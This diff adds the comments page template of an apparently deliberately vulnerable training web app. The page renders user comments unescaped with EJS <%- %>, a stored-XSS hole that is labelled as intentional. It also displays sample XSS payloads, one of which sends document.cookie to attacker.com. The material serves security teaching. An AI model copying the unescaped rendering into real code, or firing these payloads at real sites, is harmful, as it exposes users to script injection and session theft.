@@ -1,0 +1,51 @@
+<%- include('partials/header') %>
+
+<div class="section">
+  <div class="page-header">
+    <h2>Comments</h2>
+    <div class="vuln-badge xss">XSS Injection Point</div>
+  </div>
+
+  <% if (currentUser) { %>
+    <div class="card">
+      <h3>Post a Comment</h3>
+      <form method="POST" action="/comments">
+        <div class="form-group">
+          <label>Your comment</label>
+          <textarea name="content" rows="3" placeholder="Write something... or try a payload"></textarea>
+        </div>
+        <button type="submit" class="btn btn-primary">Post Comment</button>
+      </form>
+
+      <div class="exploit-box">
+        <h4>XSS Payloads to Try</h4>
+        <div class="payload-list">
+          <div class="payload"><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></div>
+          <div class="payload"><code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code></div>
+          <div class="payload"><code>&lt;svg onload="alert(1)"&gt;</code></div>
+          <div class="payload"><code>&lt;script&gt;document.location='http://attacker.com?c='+document.cookie&lt;/script&gt;</code></div>
+        </div>
+        <p class="vuln-explain">
+          <strong>Why it works:</strong> Comments are rendered with EJS <code>&lt;%-&gt;</code> (unescaped) instead of <code>&lt;%=&gt;</code>.
+          Server stores raw input, browser executes it as HTML/JS.
+        </p>
+      </div>
+    </div>
+  <% } else { %>
+    <div class="alert info"><a href="/login">Login</a> to post comments.</div>
+  <% } %>
+
+  <h3 style="margin-top:2rem">All Comments</h3>
+  <% if (comments.length === 0) { %>
+    <p class="empty">No comments yet.</p>
+  <% } %>
+  <% comments.forEach(comment => { %>
+    <div class="card comment-card">
+      <div class="comment-meta"> <strong><%= comment.username %></strong> · <span class="time"><%= comment.created_at %></span></div>
+      <!-- VULN: <%- %> renders raw HTML — XSS here -->
+      <div class="comment-body"><%- comment.content %></div>
+    </div>
+  <% }) %>
+</div>
+
+<%- include('partials/footer') %>
